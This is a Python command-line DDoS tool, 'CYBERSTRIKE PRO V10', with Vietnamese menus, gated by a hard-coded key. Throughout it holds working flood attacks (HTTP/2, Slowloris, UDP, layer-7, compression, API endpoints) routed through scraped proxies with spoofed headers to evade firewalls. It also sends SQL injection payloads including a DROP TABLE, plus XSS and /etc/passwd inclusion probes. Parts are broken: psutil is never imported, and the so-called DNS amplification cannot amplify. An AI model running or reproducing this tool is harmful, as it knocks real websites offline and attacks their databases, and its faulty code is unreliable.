#!/usr/bin/env python3

# -*- coding: utf-8 -*-
# ©️ Quang Bảo 2025 - All Rights Reserved

import requests
import threading
import multiprocessing
import time
import urllib.parse
import os
import random
import hashlib
import json
from datetime import datetime
import whois
import dns.resolver
from bs4 import BeautifulSoup
import asyncio
import aiohttp
from concurrent.futures import ThreadPoolExecutor
from rich.console import Console
from rich.table import Table
from rich.panel import Panel
from rich.prompt import Prompt, Confirm
from rich.progress import Progress, SpinnerColumn, TextColumn, BarColumn
from rich.theme import Theme
from rich.text import Text
from rich import print as rprint
import socket
import ssl
import base64
import zlib
import re
from typing import Dict, List
import aiohttp_socks
from fake_useragent import UserAgent

# Khởi tạo console với theme màu
custom_theme = Theme({
    "info": "bold cyan",
    "warning": "bold yellow",
    "error": "bold red",
    "success": "bold green",
    "highlight": "bold magenta",
    "vip": "bold blue",
})
console = Console(theme=custom_theme)

# Dấu nhắc kiểu hacker
def hacker_prompt(message, default=None):
    prompt_text = f"[bold magenta]┌──(quangbao㉿attack)-[~]\n└─$[/] [bold cyan]{message}[/]"
    return Prompt.ask(prompt_text, default=default)

# Kiểm tra khóa xác thực
def check_auth_key():
    console.print("[info]CHÀO MỪNG BẠN ĐÃ ĐẾN VỚI [bold magenta]BÌNH NGUYÊN VÔ TẬN...[/] [success][⚡][/]")
    key = hacker_prompt("Nhập key xác thực: ")
    if key != "baoddos":
        console.print("[error]LỖI: Key không đúng! Thoát chương trình. [error][✗][/]")
        exit(1)
    console.print("[success]XÁC THỰC: Key hợp lệ! Truy cập hệ thống. [success][✓][/]")

# Kiểm tra tính toàn vẹn tệp
def check_file_integrity():
    global EXPECTED_HASH
    EXPECTED_HASH = None
    try:
        with open(__file__, 'rb') as f:
            file_content = f.read()
            file_hash = hashlib.sha256(file_content).hexdigest()
            if EXPECTED_HASH is None:
                EXPECTED_HASH = file_hash
                console.print(f"[warning]HỆ THỐNG: Tạo mã băm mới: [bold magenta]{file_hash}[/] [success][✓][/]")
            elif file_hash != EXPECTED_HASH:
                console.print(f"[error]LỖI NGHIÊM TRỌNG: Tệp bị thay đổi! Thoát. [bold red][✗][/]")
                exit(1)
    except Exception as e:
        console.print(f"[error]LỖI NGHIÊM TRỌNG: Kiểm tra tính toàn vẹn thất bại: [bold red]{str(e)}[/] [error][✗][/]")
        exit(1)

# Xóa màn hình
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Hiệu ứng tải
def loading_animation(message, duration):
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(),
        console=console
    ) as progress:
        task = progress.add_task(f"[info]{message}[/]", total=100)
        for i in range(0, 101, 25):
            progress.update(task, advance=25, description=f"[info]{message} [{i}%]...[/]")
            time.sleep(duration / 4)
        progress.update(task, description=f"[success]{message} [100%]! [✓][/]")

# Danh sách User-Agent (sử dụng fake_useragent)
ua = UserAgent()
def generate_random_headers() -> Dict[str, str]:
    return {
        'User-Agent': ua.random,
        'Accept': random.choice(['text/html', 'application/json', '*/*']),
        'Accept-Language': random.choice(['en-US,en;q=0.9', 'vi-VN,vi;q=0.9']),
        'Accept-Encoding': random.choice(['gzip, deflate', 'br']),
        'Connection': 'keep-alive',
        'Cache-Control': random.choice(['no-cache', 'max-age=0']),
        'Referer': random.choice(['https://google.com', 'https://bing.com']),
        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
        'X-Requested-With': 'XMLHttpRequest',
        'Pragma': 'no-cache',
    }

# API Proxy từ dịch vụ bên thứ ba
async def fetch_proxies_from_api(api_url: str = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http") -> List[Dict[str, str]]:
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(api_url, timeout=10) as response:
                proxy_list = await response.text()
                proxies = [
                    {"http": f"http://{proxy}", "https": f"http://{proxy}"}
                    for proxy in proxy_list.splitlines() if proxy
                ]
                console.print(f"[success]API PROXY: Tải thành công [bold green]{len(proxies)}[/] proxy từ API. [success][✓][/]")
                return proxies
    except Exception as e:
        console.print(f"[error]API PROXY: Lỗi khi tải proxy: [bold red]{str(e)}[/] [error][✗][/]")
        return []

# Danh sách proxy toàn cục
PROXY_LIST = []
async def init_proxy_pool():
    global PROXY_LIST
    PROXY_LIST = await fetch_proxies_from_api()
    if not PROXY_LIST:
        console.print("[warning]HỆ THỐNG: Không có proxy, sử dụng kết nối trực tiếp. [warning][⚠][/]")

def get_random_proxy() -> Dict[str, str]:
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# Bộ đếm toàn cục
manager = threading.Lock()
success_count = 0
error_count = 0
response_times = []

# Xác thực URL
def validate_url(url: str) -> str:
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    try:
        result = urllib.parse.urlparse(url)
        if not result.scheme or not result.netloc:
            raise ValueError("URL không hợp lệ")
        return url
    except Exception as e:
        raise ValueError(f"URL không hợp lệ: [bold red]{e}[/]")

# Đánh giá mức độ bảo mật mục tiêu (nâng cấp)
def assess_target_security(url: str) -> tuple:
    security_level = "TRUNG BÌNH"
    recommended_threads = 1000
    recommended_requests = 1000
    try:
        response = requests.head(url, headers=generate_random_headers(), timeout=5)
        headers = response.headers
        waf_indicators = ['cloudflare', 'akamai', 'sucuri', 'f5', 'imperva']
        server = headers.get('Server', '').lower()
        cdn_waf_detected = any(waf in server or waf in headers.get('X-Powered-By', '').lower() for waf in waf_indicators)
        rate_limit = 'X-RateLimit-Limit' in headers or response.status_code in (429, 403)
        domain = urllib.parse.urlparse(url).hostname
        whois_info = whois.whois(domain)
        creation_date = whois_info.get('creation_date')
        domain_age = (datetime.now() - creation_date[0]).days if isinstance(creation_date, list) and creation_date else 0

        # Kiểm tra SSL/TLS
        ssl_info = check_ssl_security(domain)
        ssl_level = ssl_info.get("security_level", "LOW")

        if cdn_waf_detected or rate_limit or ssl_level == "HIGH":
            security_level = "CAO"
            recommended_threads = 10000
            recommended_requests = 5000
        elif domain_age > 365 or ssl_level == "MEDIUM":
            security_level = "TRUNG BÌNH"
            recommended_threads = 5000
            recommended_requests = 2000
        else:
            security_level = "THẤP"
            recommended_threads = 1000
            recommended_requests = 1000

        console.print(f"[info]HỆ THỐNG: Đánh giá bảo mật: [bold magenta]{security_level}[/], SSL: [bold cyan]{ssl_level}[/], Luồng: [bold cyan]{recommended_threads:,}[/], Yêu cầu: [bold cyan]{recommended_requests:,}[/] [success][✓][/]")
    except Exception as e:
        console.print(f"[warning]HỆ THỐNG: Không thể đánh giá bảo mật: [bold yellow]{str(e)}[/]. Sử dụng giá trị mặc định. [warning][⚠][/]")
    return security_level, recommended_threads, recommended_requests

# Kiểm tra bảo mật SSL/TLS
def check_ssl_security(hostname: str) -> Dict:
    try:
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                cipher = ssock.cipher()
                security_level = "LOW"
                if cipher[1] >= 256 and "TLSv1.3" in cipher[2]:
                    security_level = "HIGH"
                elif cipher[1] >= 128:
                    security_level = "MEDIUM"
                return {
                    "security_level": security_level,
                    "cipher": cipher[0],
                    "bits": cipher[1],
                    "protocol": cipher[2]
                }
    except Exception as e:
        console.print(f"[warning]SSL SCAN: Lỗi kiểm tra SSL: [bold yellow]{str(e)}[/] [warning][⚠][/]")
        return {"security_level": "LOW"}

# Điều chỉnh luồng theo khả năng thiết bị
def adjust_threads_for_device(num_threads: int, num_requests: int) -> tuple:
    cpu_count = multiprocessing.cpu_count()
    mem_info = psutil.virtual_memory() if 'psutil' in globals() else type('obj', (), {'total': 8*1024*1024*1024})()
    max_threads = min(num_threads, cpu_count * 1000, int(mem_info.total / (1024 * 1024)))  # Giới hạn theo CPU và RAM
    max_requests = min(num_requests, 9999999)
    console.print(f"[info]HỆ THỐNG: Điều chỉnh: [bold cyan]{max_threads:,}[/] luồng, [bold cyan]{max_requests:,}[/] yêu cầu dựa trên [bold magenta]{cpu_count}[/] CPU và [bold magenta]{mem_info.total/1024/1024:.0f}[/]MB RAM. [success][✓][/]")
    return max_threads, max_requests

# VIP Feature 1: Tấn công HTTP/2 Flood
async def http2_flood_attack(url: str, requests_per_thread: int, duration: float):
    global success_count, error_count, response_times
    try:
        async with aiohttp.ClientSession(
            connector=aiohttp.TCPConnector(ssl=False, force_close=True),
            headers=generate_random_headers(),
            timeout=aiohttp.ClientTimeout(total=3)
        ) as session:
            start_time = time.time()
            while time.time() - start_time < duration:
                try:
                    async with session.get(url, proxy=get_random_proxy()) as response:
                        console.print(f"[vip]HTTP/2 FLOOD: Mã trạng thái: [bold green]{response.status}[/] [success][✓][/]")
                        with manager:
                            success_count += 1
                            response_times.append((time.time() - start_time) * 1000)
                except Exception as e:
                    with manager:
                        error_count += 1
                    console.print(f"[error]HTTP/2 FLOOD: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
                await asyncio.sleep(random.uniform(0.00005, 0.0001))
    except Exception as e:
        console.print(f"[error]HTTP/2 FLOOD: Lỗi khởi tạo: [bold red]{str(e)}[/] [error][✗][/]")

# VIP Feature 2: Tấn công Slowloris
def slowloris_attack(url: str, duration: float):
    global success_count, error_count, response_times
    try:
        parsed_url = urllib.parse.urlparse(url)
        host = parsed_url.hostname
        port = parsed_url.port or (443 if parsed_url.scheme == 'https' else 80)
        sockets = []
        start_time = time.time()
        while time.time() - start_time < duration:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                s.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nConnection: keep-alive\r\n\r\n".encode())
                sockets.append(s)
                console.print(f"[vip]SLOWLORIS: Kết nối mở: [bold green]{len(sockets)}[/] [success][✓][/]")
                time.sleep(random.uniform(0.1, 0.5))
            except Exception as e:
                with manager:
                    error_count += 1
                console.print(f"[error]SLOWLORIS: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
        for s in sockets:
            s.close()
    except Exception as e:
        console.print(f"[error]SLOWLORIS: Lỗi: [bold red]{str(e)}[/] [error][✗][/]")

# VIP Feature 3: Tấn công DNS Amplification
def dns_amplification_attack(target_ip: str, duration: float):
    global success_count, error_count
    resolver = dns.resolver.Resolver()
    open_resolvers = ['8.8.8.8', '1.1.1.1']
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            for server in open_resolvers:
                resolver.nameservers = [server]
                query = dns.message.make_query(target_ip, dns.rdatatype.ANY)
                response = resolver.query(query)
                console.print(f"[vip]DNS AMP: Gửi yêu cầu đến [bold green]{server}[/] [success][✓][/]")
                with manager:
                    success_count += 1
        except Exception as e:
            with manager:
                error_count += 1
            console.print(f"[error]DNS AMP: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
        time.sleep(0.1)

# VIP Feature 4: Tấn công Payload Compression
def compression_attack(url: str, requests_per_thread: int, duration: float):
    global success_count, error_count, response_times
    session = requests.Session()
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            large_payload = zlib.compress(b'A' * 1000000)  # Payload lớn nén lại
            headers = generate_random_headers()
            headers['Content-Encoding'] = 'deflate'
            response = session.post(url, data=large_payload, headers=headers, proxies=get_random_proxy(), timeout=3)
            console.print(f"[vip]COMPRESSION: Mã trạng thái: [bold green]{response.status_code}[/] [success][✓][/]")
            with manager:
                success_count += 1
                response_times.append((time.time() - start_time) * 1000)
        except Exception as e:
            with manager:
                error_count += 1
            console.print(f"[error]COMPRESSION: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
        time.sleep(random.uniform(0.00005, 0.0001))

# VIP Feature 5: Tấn công Application Layer (L7)
async def application_layer_attack(url: str, requests_per_thread: int, duration: float):
    global success_count, error_count, response_times
    try:
        async with aiohttp.ClientSession(headers=generate_random_headers()) as session:
            start_time = time.time()
            while time.time() - start_time < duration:
                try:
                    async with session.get(url + '?' + ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=50)), proxy=get_random_proxy()) as response:
                        console.print(f"[vip]L7 ATTACK: Mã trạng thái: [bold green]{response.status}[/] [success][✓][/]")
                        with manager:
                            success_count += 1
                            response_times.append((time.time() - start_time) * 1000)
                except Exception as e:
                    with manager:
                        error_count += 1
                    console.print(f"[error]L7 ATTACK: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
                await asyncio.sleep(random.uniform(0.00005, 0.0001))
    except Exception as e:
        console.print(f"[error]L7 ATTACK: Lỗi khởi tạo: [bold red]{str(e)}[/] [error][✗][/]")

# VIP Feature 6: Bypassing WAF
def waf_bypass_attack(url: str, requests_per_thread: int, duration: float):
    global success_count, error_count, response_times
    session = requests.Session()
    bypass_headers = generate_random_headers()
    bypass_headers['X-Originating-IP'] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    bypass_headers['CF-Connecting-IP'] = bypass_headers['X-Originating-IP']
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            response = session.get(url, headers=bypass_headers, proxies=get_random_proxy(), timeout=3)
            console.print(f"[vip]WAF BYPASS: Mã trạng thái: [bold green]{response.status_code}[/] [success][✓][/]")
            with manager:
                success_count += 1
                response_times.append((time.time() - start_time) * 1000)
        except Exception as e:
            with manager:
                error_count += 1
            console.print(f"[error]WAF BYPASS: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
        time.sleep(random.uniform(0.00005, 0.0001))

# VIP Feature 7: Tấn công API Endpoint
async def api_endpoint_attack(url: str, duration: float):
    global success_count, error_count, response_times
    try:
        async with aiohttp.ClientSession(headers=generate_random_headers()) as session:
            start_time = time.time()
            while time.time() - start_time < duration:
                try:
                    endpoints = [url + '/api/v1', url + '/api/v2', url + '/graphql']
                    for endpoint in endpoints:
                        async with session.get(endpoint, proxy=get_random_proxy()) as response:
                            console.print(f"[vip]API ATTACK: Mã trạng thái: [bold green]{response.status}[/] cho [bold cyan]{endpoint}[/] [success][✓][/]")
                            with manager:
                                success_count += 1
                                response_times.append((time.time() - start_time) * 1000)
                except Exception as e:
                    with manager:
                        error_count += 1
                    console.print(f"[error]API ATTACK: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
                await asyncio.sleep(random.uniform(0.00005, 0.0001))
    except Exception as e:
        console.print(f"[error]API ATTACK: Lỗi khởi tạo: [bold red]{str(e)}[/] [error][✗][/]")

# VIP Feature 8: Tấn công UDP Flood
def udp_flood_attack(target_ip: str, port: int, duration: float):
    global success_count, error_count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    start_time = time.time()
    while time.time() - start_time < duration:
        try:
            payload = random._urandom(1024)
            sock.sendto(payload, (target_ip, port))
            console.print(f"[vip]UDP FLOOD: Gửi payload đến [bold green]{target_ip}:{port}[/] [success][✓][/]")
            with manager:
                success_count += 1
        except Exception as e:
            with manager:
                error_count += 1
            console.print(f"[error]UDP FLOOD: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
        time.sleep(0.01)
    sock.close()

# VIP Feature 9: Quét Subdomain
async def subdomain_scan(domain: str) -> List[str]:
    subdomains = []
    common_subdomains = ['www', 'mail', 'ftp', 'api', 'dev', 'test', 'staging']
    async with aiohttp.ClientSession() as session:
        for sub in common_subdomains:
            try:
                url = f"http://{sub}.{domain}"
                async with session.head(url, timeout=5) as response:
                    if response.status < 400:
                        subdomains.append(url)
                        console.print(f"[vip]SUBDOMAIN SCAN: Tìm thấy [bold green]{url}[/] [success][✓][/]")
            except Exception:
                pass
    return subdomains

# VIP Feature 10: Phân tích cấu trúc web
async def web_structure_analysis(url: str) -> Dict:
    structure = {"endpoints": [], "forms": [], "links": []}
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(url, headers=generate_random_headers(), timeout=10) as response:
                soup = BeautifulSoup(await response.text(), 'html.parser')
                structure["endpoints"] = [a['href'] for a in soup.find_all('a', href=True) if a['href'].startswith('/')]
                structure["forms"] = [form.get('action') for form in soup.find_all('form') if form.get('action')]
                structure["links"] = [link['href'] for link in soup.find_all('link', href=True)]
                console.print(f"[vip]WEB ANALYSIS: Phân tích thành công [bold green]{url}[/] [success][✓][/]")
    except Exception as e:
        console.print(f"[error]WEB ANALYSIS: Thất bại: [bold red]{str(e)}[/] [error][✗][/]")
    return structure

# Tấn công clog (hàm gốc)
def clog_attack(url: str, requests_per_thread: int, duration: float):
    global success_count, error_count, response_times
    session = requests.Session()
    start_time = time.time()
    max_retries = 3
    while time.time() - start_time < duration:
        retries = 0
        while retries < max_retries:
            try:
                headers = generate_random_headers()
                proxy = get_random_proxy()
                response = session.get(url, headers=headers, proxies=proxy, timeout=3)
                console.print(f"[error]CLOG ATTACK: Mã trạng thái: [bold green]{response.status_code}[/] [success][✓][/] ©2025 Quang Bao - DDos Attack")
                with manager:
                    success_count += 1
                    response_times.append((time.time() - start_time) * 1000)
                break
            except requests.exceptions.ReadTimeout as e:
                retries += 1
                if retries == max_retries:
                    with manager:
                        error_count += 1
                    console.print(f"[error]CLOG ATTACK: Thất bại sau {max_retries} lần thử: [bold red]{str(e)}[/] [error][✗][/] ©2025 Quang Bao - DDos Attack")
                else:
                    console.print(f"[warning]CLOG ATTACK: Timeout, thử lại lần {retries + 1}... [warning][⚠][/] ©2025 Quang Bao - DDos Attack")
                    time.sleep(0.1)
            except Exception as e:
                with manager:
                    error_count += 1
                console.print(f"[error]CLOG ATTACK: Thất bại: [bold red]{str(e)}[/] [error][✗][/] ©2025 Quang Bao - DDos Attack")
                break
        time.sleep(random.uniform(0.00005, 0.0001))

# Quét lỗ hổng web nâng cao
async def scan_vulnerabilities(url: str) -> List[Dict]:
    vulnerabilities = []
    async with aiohttp.ClientSession() as session:
        try:
            sql_payloads = ["' OR '1'='1", "1; DROP TABLE users --", "' UNION SELECT NULL --"]
            for payload in sql_payloads:
                async with session.get(f"{url}?id={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
                    text = await response.text()
                    if any(error in text.lower() for error in ["sql syntax", "mysql", "database"]):
                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "severity": "High",
                            "description": f"Potential SQL Injection with payload: [bold magenta]{payload}[/]",
                            "recommendation": "Use prepared statements and input validation."
                        })
                        break
        except Exception as e:
            console.print(f"[warning]VULN SCAN: SQL Injection scan failed: [bold yellow]{str(e)}[/] [warning][✗][/]")

        try:
            xss_payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>", "<svg onload=alert('XSS')>"]
            for payload in xss_payloads:
                async with session.get(f"{url}?q={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
                    text = await response.text()
                    if payload in text:
                        vulnerabilities.append({
                            "type": "Cross-Site Scripting (XSS)",
                            "severity": "Medium",
                            "description": f"Reflected XSS with payload: [bold magenta]{payload}[/]",
                            "recommendation": "Encode all output and use Content Security Policy."
                        })
                        break
        except Exception as e:
            console.print(f"[warning]VULN SCAN: XSS scan failed: [bold yellow]{str(e)}[/] [warning][✗][/]")

        try:
            lfi_payloads = ["../../etc/passwd", "../config.php"]
            for payload in lfi_payloads:
                async with session.get(f"{url}?file={urllib.parse.quote(payload)}", headers=generate_random_headers(), timeout=5) as response:
                    text = await response.text()
                    if "root:" in text or "php" in text.lower():
                        vulnerabilities.append({
                            "type": "Local File Inclusion (LFI)",
                            "severity": "Critical",
                            "description": f"Potential LFI with payload: [bold magenta]{payload}[/]",
                            "recommendation": "Restrict file access and validate input paths."
                        })
                        break
        except Exception as e:
            console.print(f"[warning]VULN SCAN: LFI scan failed: [bold yellow]{str(e)}[/] [warning][✗][/]")

    return vulnerabilities

# Hiển thị báo cáo lỗ hổng
def display_vulnerability_report(vulnerabilities: List[Dict]):
    table = Table(title="[info]BÁO CÁO LỖ HỔNG BẢO MẬT[/]", style="info")
    table.add_column("Loại", style="highlight")
    table.add_column("Mức độ", style="warning")
    table.add_column("Mô tả")
    table.add_column("Khuyến nghị", style="success")
    for vuln in vulnerabilities:
        table.add_row(vuln["type"], vuln["severity"], vuln["description"], vuln["recommendation"])
    console.print(table)
    if not vulnerabilities:
        console.print("[success]VULN SCAN: Không phát hiện lỗ hổng! [✓][/]")
    hacker_prompt("HỆ THỐNG: Nhấn Enter để trở về menu: ")

# Hiển thị menu chính (cập nhật với các tính năng VIP)
def display_menu():
    clear_screen()
    table = Table(title="[info]CYBERSTRIKE PRO V10 © Quang Bao 2025[/]", style="info")
    table.add_column("ID", style="highlight")
    table.add_column("Chức năng", style="success")
    table.add_column("Mô tả")
    table.add_row("1", "[bold green]TẤN CÔNG CLOG[/]", "Tấn công làm nghẽn bằng yêu cầu tốc độ cao")
    table.add_row("2", "[bold green]QUÉT LỖ HỔNG[/]", "Quét lỗ hổng web nâng cao")
    table.add_row("3", "[vip]HTTP/2 FLOOD[/]", "Tấn công HTTP/2 tốc độ cao")
    table.add_row("4", "[vip]SLOWLORIS[/]", "Tấn công giữ kết nối chậm")
    table.add_row("5", "[vip]DNS AMPLIFICATION[/]", "Tấn công khuếch đại DNS")
    table.add_row("6", "[vip]COMPRESSION ATTACK[/]", "Tấn công bằng payload nén")
    table.add_row("7", "[vip]L7 ATTACK[/]", "Tấn công tầng ứng dụng")
    table.add_row("8", "[vip]WAF BYPASS[/]", "Vượt qua tường lửa ứng dụng web")
    table.add_row("9", "[vip]API ENDPOINT ATTACK[/]", "Tấn công các endpoint API")
    table.add_row("10", "[vip]UDP FLOOD[/]", "Tấn công UDP ngẫu nhiên")
    table.add_row("11", "[vip]SUBDOMAIN SCAN[/]", "Quét subdomain mục tiêu")
    table.add_row("12", "[vip]WEB STRUCTURE ANALYSIS[/]", "Phân tích cấu trúc website")
    table.add_row("13", "[bold green]THOÁT[/]", "Thoát chương trình")
    console.print(table)

# Hàm chính
def main():
    check_file_integrity()
    check_auth_key()
    multiprocessing.set_start_method('spawn')
    loop = asyncio.get_event_loop()
    loop.run_until_complete(init_proxy_pool())  # Khởi tạo proxy pool
    while True:
        try:
            display_menu()
            choice = hacker_prompt("Nhập lựa chọn (1-13): ")

            if choice == "13":
                console.print("[warning]HỆ THỐNG: Thoát chương trình [success][✓][/]")
                exit(0)

            input_url = hacker_prompt("Nhập URL hoặc IP mục tiêu: ")
            if not input_url:
                console.print("[error]LỖI: URL/IP không được để trống! [error][✗][/]")
                time.sleep(1)
                continue

            try:
                validated_url = validate_url(input_url)
                host = urllib.parse.urlparse(validated_url).hostname
                port = urllib.parse.urlparse(validated_url).port or 80
            except ValueError as e:
                host = input_url
                port = 80
                validated_url = f"http://{host}"
                console.print(f"[warning]HỆ THỐNG: Xử lý mục tiêu như IP: [bold yellow]{host}[/] [warning][⚠][/]")

            console.print(f"[success]HỆ THỐNG: Mục tiêu đã khóa: [bold cyan]{validated_url}[/] [success][✓][/]")
            loading_animation("Khóa mục tiêu", 2)

            if choice == "2":
                console.print("[info]HỆ THỐNG: Bắt đầu quét lỗ hổng... [success][⚡][/]")
                loading_animation("Quét lỗ hổng web", 3)
                vulnerabilities = loop.run_until_complete(scan_vulnerabilities(validated_url))
                display_vulnerability_report(vulnerabilities)
                continue
            elif choice == "11":
                console.print("[info]HỆ THỐNG: Bắt đầu quét subdomain... [success][⚡][/]")
                loading_animation("Quét subdomain", 3)
                subdomains = loop.run_until_complete(subdomain_scan(host))
                table = Table(title="[info]KẾT QUẢ QUÉT SUBDOMAIN[/]", style="info")
                table.add_column("Subdomain", style="highlight")
                for subdomain in subdomains:
                    table.add_row(subdomain)
                console.print(table)
                hacker_prompt("HỆ THỐNG: Nhấn Enter để trở về menu: ")
                continue
            elif choice == "12":
                console.print("[info]HỆ THỐNG: Bắt đầu phân tích cấu trúc web... [success][⚡][/]")
                loading_animation("Phân tích cấu trúc", 3)
                structure = loop.run_until_complete(web_structure_analysis(validated_url))
                table = Table(title="[info]PHÂN TÍCH CẤU TRÚC WEB[/]", style="info")
                table.add_column("Loại", style="highlight")
                table.add_column("Danh sách", style="success")
                table.add_row("Endpoints", ", ".join(structure["endpoints"]) or "Không tìm thấy")
                table.add_row("Forms", ", ".join(structure["forms"]) or "Không tìm thấy")
                table.add_row("Links", ", ".join(structure["links"]) or "Không tìm thấy")
                console.print(table)
                hacker_prompt("HỆ THỐNG: Nhấn Enter để trở về menu: ")
                continue

            # Nhập tham số tấn công
            num_threads = int(hacker_prompt("Nhập số luồng (1-999999, mặc định: 1000): ", default="1000"))
            requests_per_thread = int(hacker_prompt("Nhập số yêu cầu mỗi luồng (1-9999999, mặc định: 1000): ", default="1000"))
            duration = int(hacker_prompt("Nhập thời gian tấn công (giây, mặc định: 60): ", default="60"))

            num_threads = min(max(1, num_threads), 999999)
            requests_per_thread = min(max(1, requests_per_thread), 9999999)
            duration = max(1, duration)

            num_threads, requests_per_thread = adjust_threads_for_device(num_threads, requests_per_thread)

            console.print("[info]HỆ THỐNG: Đang đánh giá bảo mật... [success][⚡][/]")
            loading_animation("Đánh giá bảo mật", 2)
            security_level, recommended_threads, recommended_requests = assess_target_security(validated_url)

            attack_strategy = "TẤN CÔNG NHẸ" if security_level == "THẤP" else "LỰC LƯỢNG TỐI ĐA" if security_level == "CAO" else "LỰC LƯỢNG VỪA PHẢI"
            if security_level == "THẤP":
                num_threads = min(recommended_threads, num_threads // 2)
                requests_per_thread = min(recommended_requests, requests_per_thread // 2)
            elif security_level == "CAO":
                num_threads = max(recommended_threads, num_threads)
                requests_per_thread = max(recommended_requests, requests_per_thread)

            panel = Panel(
                f"""
[bold cyan]CHIẾN LƯỢC: [bold magenta]{'VIP ATTACK' if choice in ['3','4','5','6','7','8','9','10'] else 'CLOG ATTACK'}[/]
[bold cyan]Mục tiêu: [bold green]{validated_url}[/]
[bold cyan]Luồng: [bold green]{num_threads:,}[/]
[bold cyan]Yêu cầu/Luồng: [bold green]{requests_per_thread:,}[/]
[bold cyan]Thời gian: [bold green]{duration}[/] giây
[bold cyan]Chiến lược: [bold magenta]{attack_strategy}[/]
[bold cyan]Tổng lượt đánh: [bold green]{num_threads * requests_per_thread:,}[/]
[bold cyan]Bản quyền: [bold yellow]©2025 Quang Bao - DDos Attack[/]
                """,
                title="[info]THÔNG TIN TẤN CÔNG[/]",
                style="info"
            )
            console.print(panel)
            confirm = Confirm.ask("[error]HỆ THỐNG: Xác nhận tấn công [success][?][/]")
            if not confirm:
                console.print("[warning]HỆ THỐNG: Hủy tấn công [warning][⚠][/]")
                continue

            console.print("[error]HỆ THỐNG: Khởi động tấn công... [success][⚡][/]")
            loading_animation("Khởi động hệ thống", 3)

            global success_count, error_count, response_times
            success_count = 0
            error_count = 0
            response_times = []
            start_time = time.time()

            threads = []
            if choice == "1":
                for _ in range(num_threads):
                    t = threading.Thread(target=clog_attack, args=(validated_url, requests_per_thread, duration))
                    threads.append(t)
                    t.start()
            elif choice == "3":
                async def run_http2():
                    tasks = [http2_flood_attack(validated_url, requests_per_thread, duration) for _ in range(num_threads)]
                    await asyncio.gather(*tasks)
                loop.run_until_complete(run_http2())
            elif choice == "4":
                for _ in range(num_threads):
                    t = threading.Thread(target=slowloris_attack, args=(validated_url, duration))
                    threads.append(t)
                    t.start()
            elif choice == "5":
                for _ in range(num_threads):
                    t = threading.Thread(target=dns_amplification_attack, args=(host, duration))
                    threads.append(t)
                    t.start()
            elif choice == "6":
                for _ in range(num_threads):
                    t = threading.Thread(target=compression_attack, args=(validated_url, requests_per_thread, duration))
                    threads.append(t)
                    t.start()
            elif choice == "7":
                async def run_l7():
                    tasks = [application_layer_attack(validated_url, requests_per_thread, duration) for _ in range(num_threads)]
                    await asyncio.gather(*tasks)
                loop.run_until_complete(run_l7())
            elif choice == "8":
                for _ in range(num_threads):
                    t = threading.Thread(target=waf_bypass_attack, args=(validated_url, requests_per_thread, duration))
                    threads.append(t)
                    t.start()
            elif choice == "9":
                async def run_api_attack():
                    tasks = [api_endpoint_attack(validated_url, duration) for _ in range(num_threads)]
                    await asyncio.gather(*tasks)
                loop.run_until_complete(run_api_attack())
            elif choice == "10":
                for _ in range(num_threads):
                    t = threading.Thread(target=udp_flood_attack, args=(host, port, duration))
                    threads.append(t)
                    t.start()

            try:
                for t in threads:
                    t.join()
            except KeyboardInterrupt:
                console.print("[warning]HỆ THỐNG: Tấn công bị dừng bởi người dùng [warning][⚠][/]")
                exit(0)

            total_time = time.time() - start_time
            avg_response_time = sum(response_times) / len(response_times) if response_times else 0
            max_response_time = max(response_times) if response_times else 0
            min_response_time = min(response_times) if response_times else 0

            report = Panel(
                f"""
[bold cyan]BÁO CÁO CHIẾN DỊCH: [bold magenta]{'VIP ATTACK' if choice in ['3','4','5','6','7','8','9','10'] else 'CLOG ATTACK'}[/]
[bold cyan]Tổng lượt đánh: [bold green]{num_threads * requests_per_thread:,}[/]
[bold cyan]Thành công: [bold green]{success_count:,} ({(success_count/(num_threads * requests_per_thread)*100):.1f}%)[/] [success][✓][\\]
[bold cyan]Thất bại: [bold red]{error_count:,} ({(error_count/(num_threads * requests_per_thread)*100):.1f}%)[/] [error][✗][\\]
[bold cyan]Tổng thời gian: [bold green]{total_time:.2f}[/] giây
[bold cyan]Thời gian phản hồi trung bình: [bold green]{avg_response_time:.2f}[/]ms
[bold cyan]Hiệu suất đỉnh: [bold green]{max_response_time:.2f}[/]ms
[bold cyan]Độ trễ tối thiểu: [bold green]{min_response_time:.2f}[/]ms
[bold cyan]Lượt đánh/giây: [bold green]{(num_threads * requests_per_thread)/total_time:.0f}[/]
[bold cyan]Bản quyền: [bold yellow]©2025 Quang Bao - DDos Attack[/]
                """,
                title="[info]BÁO CÁO TẤN CÔNG[/]",
                style="success"
            )
            console.print(report)

        except KeyboardInterrupt:
            console.print("[warning]HỆ THỐNG: Tấn công bị dừng bởi người dùng [warning][⚠][/]")
            exit(0)
